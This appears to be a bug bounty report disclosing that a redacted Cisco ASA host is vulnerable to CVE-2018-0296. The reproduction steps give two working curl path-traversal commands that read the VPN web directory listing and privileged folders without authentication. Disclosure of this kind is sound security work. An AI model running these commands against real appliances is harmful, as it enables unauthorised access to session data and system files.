## Vulnerability Information
Summary:
https://█████ is an ASA running software vulnerable to CVE-2018-0296 which allows a remote attacker to exploit a path traversal vulnerability and bypass authentication to sensitive files. The attacker can use this to enumerate the ASA VPN web directory structure and exploit privileged access to the system to gain access to session information.

Step-by-step Reproduction Instructions

1. You can exploit with cURL or Burp: 
`curl -vk -m 45 --path-as-is https://████████/+CSCOU+/../+CSCOE+/files/file_list.json`
2. You can alter the command slightly to pull additional directory information: 
`curl -vk -m 45 --path-as-is https://█████████/+CSCOU+/../+CSCOE+/files/file_list.json?path=%2bCSCOE%2b` to dig into these privileged directories.
3. I also pushed a request to repeater to do this in Burp for screenshots.
